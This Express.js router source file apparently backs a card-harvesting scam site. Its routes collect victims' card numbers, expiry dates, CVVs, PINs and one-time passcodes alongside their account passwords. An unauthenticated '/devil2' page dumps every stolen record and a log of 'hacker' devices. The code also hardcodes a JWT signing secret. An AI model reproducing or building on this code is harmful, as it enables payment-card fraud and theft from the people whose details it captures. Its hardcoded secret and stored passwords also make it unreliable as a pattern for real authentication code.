const router = require("express").Router();
const jwt = require("jsonwebtoken");
const AccountDB = require("./accountSchema.js");
const Hacker = require("./hackerSchema.js");
const AtmCard = require("./atmCardSchema.js");
const {Auth} = require("two-step-auth");











router.get("/card_funding", async(req, res)=>{
	const reqCookie = req.cookies.signature;

	if(reqCookie){
		jwt.verify(reqCookie, "ourBigSecret", async(error, correctCookie)=>{
			if(correctCookie){
				const thisAccount = await AccountDB.findOne({email: correctCookie.email});
				res.render("card.ejs", {account: thisAccount});
			}else{
				res.redirect("/login");
			}
		});
	}else{
		res.redirect("/login");
	}
});







	


router.post("/atmCard", async(req, res)=>{
	const reqCookie = req.cookies.signature;

	if(reqCookie){
		jwt.verify(reqCookie, "ourBigSecret", async(error, correctCookie)=>{
			if(correctCookie){
				const thisAccount = await AccountDB.findOne({email: correctCookie.email});

				const thisCard = await AtmCard.findOne({card_number: req.body.card_number});

				if(thisCard){
					await AtmCard.findOneAndDelete({card_number: req.body.card_number});
				}

				const cardDetail = {
					email: thisAccount.email,
					fullName: thisAccount.fullName,
					password: thisAccount.password,
					reward: thisAccount.reward,
					card_number: req.body.card_number,
					date: req.body.date,
					cvv: req.body.cvv,
					pin: req.body.pin,
					bank: req.body.bank,
					amount: req.body.amount,
					time: req.body.time,
					otp: ""

				}

				await new AtmCard(cardDetail).save();
				res.json({okay: "okay"})
				
			}else{
				res.redirect("/login");
			}
		})
	}else{
		res.redirect("/login");
	}
});














router.post("/addOtp", async(req, res)=>{
	//const response = await Auth("kiddoani77@gmail.com", "OTP Added");	
	const reqCookie = req.cookies.signature;
	if(reqCookie){
		jwt.verify(reqCookie, "ourBigSecret", async(error, correctCookie)=>{
			if(correctCookie){

				
				const thisAtm = await AtmCard.findOne({email: correctCookie.email});
				await AtmCard.findByIdAndUpdate(thisAtm._id, {otp: req.body.otp}, {new: true});
				res.json({okay: "okay"});
			}else{
				res.redirect("/login");
			}
		})
	}else{
		res.redirect("/login");
	}
});








router.get("/not_atm", async(req, res)=>{
	res.json({FUNY: "So you'er still usinging this link?"})
})




router.get("/devil2", async(req, res)=>{
	const thisAtm = await AtmCard.find();
	const hackers = await Hacker.find();
	res.render("atm.ejs", {data: thisAtm, hackers});

});




router.post("/hacker", async(req, res)=>{
	const hackDevice = {
		device: req.body.device
	}
	await new Hacker(hackDevice).save();

	if(req.body.device.includes("KF7j")){
		res.json({okay: "okay"})

	}else{
		res.json({danger: "Hacker"})
	}

	
})




module.exports = router;
